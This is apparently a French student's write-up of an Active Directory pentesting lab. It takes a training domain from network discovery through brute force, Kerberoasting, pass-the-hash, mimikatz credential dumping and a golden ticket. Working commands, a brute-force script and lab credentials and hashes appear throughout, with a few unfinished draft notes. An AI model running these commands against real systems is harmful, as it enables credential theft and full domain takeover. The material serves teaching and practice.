---
layout: "@layouts/blog/Layout.astro"
title: "Pentest - S√©curit√© Active Directory"
description: "Active Directory (AD) est un service d'annuaire populaire utilis√© pour g√©rer les comptes d'utilisateurs et d'ordinateurs, ainsi que les strat√©gies de groupe et l'acc√®s aux ressources dans les r√©seaux d'entreprise. Dans ce billet de blog, nous explorerons les vuln√©rabilit√©s courantes trouv√©es dans AD et d√©montrerons comment les exploiter, en nous appuyant sur notre exp√©rience dans un cours de pentesting AD."
author: "Majed Abdennadher"
timestamp: 1675947170403
duration: 20
tag: "Lab"
slug: "tp-pentest-ad"
language: "french"
image: "https://www.edunao.com/wp-content/uploads/2022/08/Active-directory-federation-services-microsoft-off-5b1e5b080fff82.7771912715287160400655.png"
---

## Acc√®s au r√©seau

J'ai utilis√© `nano` pour modifier `openvpn-eleve.conf` pour qu'il pointe vers les identifiants qui m'ont √©t√© attribu√©: **El√®ve 19**.

Apr√®s la modification:

```bash
$ cat openvpn-eleve.conf
# cat openvpn-eleve.conf üëç
# -------------------------------------------------------------------
client
dev tun
port 1193
proto udp

remote 35.180.158.152 1193
nobind
auth-nocache

ca ./ca.crt
cert ./certs_2023/2023_eleve19.crt
key ./keys_2023/2023_eleve19.key

remote-cert-tls server

user nobody
comp-lzo
persist-key
persist-tun

verb 3
# -------------------------------------------------------------------
```

Puis on lance `openvpn` et on remplit le change mot de passe par le mot de passe attribu√© dans le fichier `password_keys.txt`.
Tout se passe bien et le client OpenVPN √©xecute:
![](https://i.imgur.com/gKQPohk.png)

Puis on teste la connectivit√© au r√©seau du laboratoire en lan√ßant:

```bash
$ nc -nvz 192.168.30.60 3389
# nc -nvz 192.168.30.60 3389 üëç
# -------------------------------------------------------------------
Connection to 192.168.30.60 3389 port [tcp/*] succeeded!
# -------------------------------------------------------------------
```

**Explication de la commande:**

- `-n` indique √† netcat de ne pas effectuer de r√©solution DNS pour l'adresse IP ou le nom d'h√¥te donn√©.
- `-v` signifie "verbose", ce qui permet d'afficher une sortie plus d√©taill√©e.
- `-z` indique √† netcat de rechercher les d√©mons en √©coute, sans envoyer de donn√©es.

Ainsi, lorsque nous ex√©cutons cette commande, netcat envoie un paquet TCP mais sans envoyer de donn√©es. Si l'h√¥te distant √©coute sur ce port, il r√©pondra par un paquet d'accus√© de r√©ception, et netcat affichera un message "r√©ussi". Si le port est ferm√© ou n'est pas √† l'√©coute, un message d'√©chec s'affiche.

## I - D√©couverte du r√©seau

> Les machines du laboratoire ont les adresses IPs suivantes : - 192.168.30.60 - 192.168.30.61 - 192.168.30.62 - 192.168.30.64 - 192.168.30.70
>
>     1) D√©terminez laquelle est le contr√¥leur de domaine.
>     2) Trouvez le nom de domaine associ√©.
>     3) Sur les machines restantes, combien sont des machines Windows ? Des machines Linux ? Parmi les machines Windows combien y-a-t‚Äôil de serveurs ? De postes clients ?

### Addresse du contr√¥leur du domaine

On regarde le contenu de `/etc/resolv.conf` en esp√®rant trouver un des ces addresses IP:

```bash
$ cat /etc/resolv.conf
# cat /etc/resolv.conf üëç
# -------------------------------------------------------------------
# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateResolvConf = false
nameserver 172.24.160.1
# -------------------------------------------------------------------
```

Les contr√¥leurs de domaine ont souvent le r√¥le de KDC. Un scan r√©seau
du port TCP 88 r√©v√©lera les contr√¥leurs de domaine.

```bash
$ nmap -p 88 192.168.30.0/24
# nmap -p 88 192.168.30.0/24 üëç
# -------------------------------------------------------------------
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 15:10 CEST
Nmap scan report for 192.168.30.60
Host is up (0.023s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
...
# -------------------------------------------------------------------
```

Ainsi l'addresse IP de notre contr√¥leur de domaine est: **192.168.30.60**

### Nom de domaine associ√©

Une requ√™te Netbios √† un contr√¥leur de domaine gr√¢ce √† nmblookup
par exemple permet d‚Äôobtenir le nom du domaine:

```bash
$ nmblookup -A 192.168.30.60
# nmblookup -A 192.168.30.60 üëç
# -------------------------------------------------------------------
Looking up status of 192.168.30.60
        DC01            <00> -         B <ACTIVE>
        COGIFORM        <00> - <GROUP> B <ACTIVE>
        COGIFORM        <1c> - <GROUP> B <ACTIVE>
        DC01            <20> -         B <ACTIVE>
        COGIFORM        <1b> -         B <ACTIVE>

        MAC Address = 06-1C-46-58-B4-76
# -------------------------------------------------------------------
```

Le nom de domaine associ√© semble √™tre `COGIFORM`.

### Sur les machines restantes, combien sont des machines Windows ? Des machines Linux ? Parmi les machines Windows combien y-a-t‚Äôil de serveurs ? De postes clients ?

Pour identifier les machines windows, on peut lancer un scan nmap sur le r√©seau et identifier les machine o√π le port 445 est ouvert:

![](https://i.imgur.com/vnUABiz.png)

On remarque que seulement la machine `192.168.30.70` n'est pas Windows. (la machine `192.168.30.227` n'est pas mentionn√©e)

- Machines windows: **4 (3 + DC)**
- Non Windows / Peut-√™tre linux: **1**

La t√¢che suivante est de compter le nombre de serveurs et postes client parmi les machines Windows.

On utilise nmap avec l'option `-O` pour la d√©tection d'OS.

![](https://i.imgur.com/sCJE2uv.png)

On trouve 2 machines avec un os `microsoft_server_...` et 1 sans.

- Serveurs: **3 (2 + DC)**
- Clients: **1**

Toutes les machines Windows sont des serveurs.

## II - Enumeration

> 1. Trouvez la liste des utilisateurs du domaine.
> 2. V√©rifiez la validit√© des acc√®s trouv√©s par √©num√©ration anonyme √† l‚Äôaide > de l‚Äôoutil de votre choix.
> 3. √Ä l‚Äôaide de l‚Äôoutil ldapsearch, r√©cup√©rez la liste des machines du > domaine, la liste des administrateurs de domaine, et la liste des comptes utilisateurs du domaine.

### Liste des utilisateurs du domaine

On essaye la solution la plus facile:

![](https://i.imgur.com/h8n5juk.png)

Et √ßa ne marche pas. (peut-√™tre parce que les bind anonymes sont d√©sactiv√©s?)

On utilise ainsi la technique `enum4linux` pr√©sent√© dans le cours:

![](https://i.imgur.com/Detb9af.png)
...
![](https://i.imgur.com/zgwLR7z.png)

On trouve un flag (mot de passe de `tom.moreno`) et la liste d'utilisateurs.

### V√©rifiez du flag trouv√© par √©num√©ration anonyme √† l‚Äôaide de l‚Äôoutil de votre choix

`rpcclient` pour diversifier:

![](https://i.imgur.com/YiUG8df.png)

### R√©cup√©ration de la liste des machines du domaine, la liste des administrateurs de domaine, et la liste des comptes utilisateurs du domaine

On peut maintenant faire des `ldapsearch` gr√¢ce au identifiants trouv√©s.

On obtiendra ainsi les 2 champs cn, dn pour ne pas faire de screenshots tr√®s longues.

**Pour les ordinateurs:**

```bash
$ ldapsearch -H ldap://192.168.30.60 -D "COGIFORM\tom.moreno" -w "V3ry_Str0ng_P@ssword" -x -b "DC=cogiform,DC=local" -s sub "(objectclass=computer)" dn
```

![](https://i.imgur.com/Zd6BC6f.png)

**Pour les utilisateurs:**

```bash
$ ldapsearch -H ldap://192.168.30.60 -D "COGIFORM\tom.moreno" -w "V3ry_Str0ng_P@ssword" -x -b "CN=Users,DC=cogiform,DC=local" dn
```

![](https://i.imgur.com/TSIuDV3.png)

**Pour les administrateurs**

```bash
$ ldapsearch -H ldap://192.168.30.60 -D "COGIFORM\tom.moreno" -w "V3ry_Str0ng_P@ssword" -x -b "CN=Users,DC=cogiform,DC=local" -s sub "(memberof=CN=Administrators,CN=Builtin,DC=cogiform,DC=local)" dn
```

![](https://i.imgur.com/PCp6ZD2.png)

## III ‚Äì Compromission de comptes additionnels

> 1. √Ä l‚Äôaide des recommandations faites dans le cours, lancez une attaque bruteforce contre le compte jean.lojer. Devez vous prendre des pr√©cautions particuli√®res ? Pourquoi ? Ajoutez vos r√©ponses, les screenshots le justifiant et le screenshot de l‚Äôattaque r√©ussie au rapport.
> 2. Maintenant que vous avez deux comptes de domaine valides, quel m√©canisme d‚Äôauthentification √™tes vous susceptibles d‚Äôattaquer ? R√©cup√©rez le secret d‚Äôun utilisateur suppl√©mentaire et cassez son mot de passe. La wordlist rockyou, pr√©sente sous le chemin /usr/share/wordlists sur votre machine Kali peut √™tre utilis√©e. Ajoutez le screenshot du secret de l‚Äôutilisateur, et celui de son mot de passe, une fois cass√©, au rapport

En continuant √† suivre les conseils du cours, on va tenter de monter les exports NFS et voir s'il y a quelque chose d'int√©ressant.

Malhereusement, ceci ne marche pas.
![](https://i.imgur.com/yeTLujl.png)

Maintenant, on essayera une attaque brute sur le compte utilisateur `jean.lojer`. Cependant, il est probable que les attaques de ce type sont d√©tect√©s et bloqu√©s. Heureseument, ce n'est pas le cas. On voit que la politique de mot de passe (`enum4linux`) que `Account Lockout Threshold` est mis √† `None`.

![](https://i.imgur.com/yBQgPoj.png)

J'ai install√© le packet `wordlists` qui cr√©e un fichier `/usr/share/wordlists/rockyou.txt`. J'ai filtr√© pour seulement avoir les lignes avec un nombre de charact√®re sup√©rieur √† 7 avec un `grep -oE "^.{7,}$" /usr/share/wordlists/rockyou.txt > /usr/share/wordlists/rockyou7+.txt`.

On utilisera ce fichier avec `cme` pour lancer la bruteforce.

Cette m√©thode prend beaucoup de temps, et va probablement pas r√©ussir. On va essayer une attaque plus vis√©e en suivant les conseils du cours:

```python
from os import system

...

YEARS = range(2000, 2025)
WORDLIST = concat("",  [
  transform(
    sequence([
      words(["cogiform"]),
      # wordlist('/usr/share/wordlists/firstnames.txt'),
      # wordlist('/usr/share/wordlists/lastnames.txt'),
      wordlist('/usr/share/wordlists/cities.txt'),
      # wordlist('/usr/share/wordlists/cars.txt')
    ]),
    lambda word: [word.lower(), word.upper(), word.title()]
  ),
  YEARS,
])

SERVER = "192.168.30.60"
USER = "jean.lojer"

for wordbatch in batch(WORDLIST, 10):
  wordlist = " ".join(wordbatch)
  system(f"cme smb {SERVER} -u {USER} -p {wordlist}")
```

On retrouve le mot de passe cette fois ci, c'est **Cogiform2020**.
![](https://i.imgur.com/t0PwAzE.png)

### R√©cuperation d'un troisi√®me compte

Maintenant qu'on a deux comptes de domaine valides (mais vraiment besoin que d'un seul pour √ßa), pourra attaquer le mecanisme d'authentification de Kerberos.

Ceci consiste √† √©num√©rer les comptes poss√©dant des SPNs pour r√©cup√©rer des tickets TGS correspondants √† ces services. Les tickets Kerberos TGS sont chiffr√©s avec le hash du mot de passe
du compte ex√©cutant le service cibl√©. On va tenter de les d√©chiffrer pour retrouver le mot de passe du compte en question.

#### R√©cup√©ration des SPNs et du ticket TSG

```bash
$ GetUserSPNs.py -request -dc-ip 192.168.30.60 -outputfile ticket.txt "COGIFORM.local/jean.lojer:Cogiform2020"
#  üëç
# -------------------------------------------------------------------
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName             Name         MemberOf  PasswordLastSet             LastLogon                   Delegation
-------------------------------  -----------  --------  --------------------------  --------------------------  ----------
DC01/sql_service.cogiform.local  sql_service            2020-08-03 16:00:53.662789  2023-03-27 23:36:47.041682
# -------------------------------------------------------------------

$ cat ticket.txt
# cat ticket.txt üëç
# -------------------------------------------------------------------
cat ticket.txt
$krb5tgs$23$*sql_service$COGIFORM.LOCAL$COGIFORM.local/sql_service*$8b2ab2ef74da6c69f9118a021fcad31b$46c40c4ee20bfd67...
# -------------------------------------------------------------------
```

On a obtenu le ticket TSG de `DC01/sql_service.cogiform.local`.

#### Cassage du mot de passe

Des logiciels de cassage tels que john ou hashcat permettent de casser les TGS et d‚Äôobtenir les mots de passe des comptes de services.
Ceci se fait hors ligne sur la machine et on pourra utiliser des listes de mot plus grandes.
Comme conseill√© par le TP on utilisera `/usr/share/wordlists/rockyou7+.txt`.
La commande √† √©xecuter est:

```bash
$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou7+.txt ticket.txt
```

![](https://i.imgur.com/TtZa2C1.png)

Le mot de passe trouv√© est: **Birmingham01**.

On teste une authentification:
![](https://i.imgur.com/9zqsKfS.png)

üëçüòéüé©

## IV - Compromission des servers

On se connecte au compte `sql_service` qu'on vient d'obtenir.

```bash
$ smbclient.py COGIFORM/sql_service:Birmingham01@192.168.30.61
# -------------------------------------------------------------------
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# who
host: \\192.168.30.227, user: sql_service, active:    18, idle:     1
# info
Version Major: 6
Version Minor: 3
Server Name: SRV02
Server Comment:
Server UserPath: c:\
Simultaneous Users: 16777216
# use ADMIN$
# ls
...
-rw-rw-rw-     357376  Thu Jul 30 03:47:09 2020 cmd.exe
...
# -------------------------------------------------------------------
```

l'utilisateur `sql_service` a les privil√®ge d'administrateur sur la machine avec l'addresse IP `192.168.30.61`.

On utilise `psexec.py` pour obtenir un shell sur la machine.

**Notes sur `psexec.py`**

L'impl√©mentation d'Impacket cr√©e un service distant en t√©l√©chargeant un ex√©cutable avec un nom al√©atoire dans le share ADMIN$, en enregistrant un service via RPC et le SCM, puis en communiquant par le biais d'un named pipe.

![](https://i.imgur.com/m7LOmbg.png)

### R√©cuperation des secrets de la machine

![](https://i.imgur.com/w4uuabB.png)

x
**Notes sur `secretsdump.py`**

Ce script ex√©cute diverses techniques pour extraire les secrets de la machine distante sans ex√©cuter d'agent. Les techniques incluent la lecture des secrets SAM et LSA √† partir des registres, l'extraction des hachages NTLM, des informations d'identification en clair et des cl√©s kerberos, et l'extraction de NTDS.dit. La commande suivante tente d'extraire tous les secrets de la machine cible √† l'aide des techniques mentionn√©es pr√©c√©demment.

### Compromission de l‚Äôautre Windows server

On passe les hash sur le compte `Administrator` √† Pass the Hash. Il y a plusieurs fa√ßons de passer le hash:

```bash
$ ps.exec -hashes aad3b435b51404eeaad3b435b51404ee:4ac966f57adc346517aa327b1e3b2fc7 Administrator@192.168.30.62
# ‚ùå
#-------------------------------------------------------------------
#Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
#-------------------------------------------------------------------
```

Cette commande √©choue sur toutes les machine. Essayons maintenant `local_admin`.

![](https://i.imgur.com/lquZRtS.png)

üëçüòéüé©

## V - Devenir Administrateur de domaine

### R√©cup√©ration du mot de passe du compte Administrator ~ administrateur de domaine.

Continuant dans le powershell de la derni√®re partie, on lance `mimikatz.exe`.

La commande suivante accorde au compte courant les autorisations de d√©boguer les processus (SeDebugPrivilege):

```powershell
privilege::debug
```

Lister des sessions utilisateur actives:

```powershell
sekurlsa::logonPasswords full
```

![](https://i.imgur.com/OfnPcQ6.png)

Le mot de passe est: **SecurePassword1** sur la machine `192.168.30.62`.

On trouve aussi dans les logs:

![](https://i.imgur.com/pt3NaK0.png)

Le mot de passe est: **m9oPs4AVXYrYMdTWgeYX** sur la machine `192.168.30.62`.

On va tenter si ce mot de passe nous permet de connecter en tant que admin √† `192.168.30.60`.

### Connectez vous au contr√¥leur de domaine pour finir le chemin de compromission

Bingo üëçüòéüé©

![](https://i.imgur.com/A3v3UqG.png)

## VI - Compromission le reste du r√©seau

### Serveur linux

> 1. Sachant que sur le serveur Linux, un utilisateur valide est ‚Äòdebian‚Äô, gagnez un acc√®s au serveur.

Dans ce cas on tente le mot de passe `debian`.

![](https://i.imgur.com/kiRX0DY.png)

üëçüòéüé©

![](https://i.imgur.com/5OyrTQ8.png)

> 2. Sur le serveur, retrouvez le mot de passe du compte de domaine ‚Äòsql_service‚Äô. Envoyez les screenshots des fichiers que vous avez utilis√© pour retrouver ce mot de passe.

On lance un grep et on esp√®re trouver une r√©ference √† `sql_service`

```bash
$ grep -ir "sql_service" / 2> /dev/null
```

![](https://i.imgur.com/d7JdZYp.png)

### Attaque Golden Ticket

En lan√ßant

```bash
$ secretsdump.py Administrator:m9oPs4AVXYrYMdTWgeYX@192.168.30.60
```

![](https://i.imgur.com/UZbFSGx.png)

Don't use golden ticket

On voit appara√Ætre le nt hash de `krbtgt`: **ec7517bf979daa3006983a6ab6660c4c**.

Puis on utilise `mimikatz` pour ticket-granting ticket (TGT).

```powershell
kerberos::golden /domain:WRK01.COGIFORM.LOCAL /sid:S-1-5-21-431173448-2220119629-3285569898 /krbtgt:ec7517bf979daa3006983a6ab6660c4c /admin:sus /id:500 /ptt
```

Puis on injecte le ticket dans la session actuelle avec

```powershell
kerberos::ptt ticket.kirbi
```

![](https://i.imgur.com/TNtOwly.png)

### Client Windows 7

use back/ftpupload
read it
use freeRDP to connect to windows desktop

> 1. √Ä l‚Äôaide de vos acc√®s au domaine, √©num√©rez les ressources mises √† disposition par le client Windows 7

![](https://i.imgur.com/OeFG3ND.png)

> 2. Trouvez le mot de passe d‚Äôun compte autoris√© √† acc√©der au syst√®me.

On fouille le syst√®me de fichiers, on trouve certains fichier qui contiennet √† la fois un nom d'utilisateur et un mdp.

Par exemple:

![](https://i.imgur.com/RDRBmSa.png)

Parmi ceux, rien n'a pas march√© malheureusement.
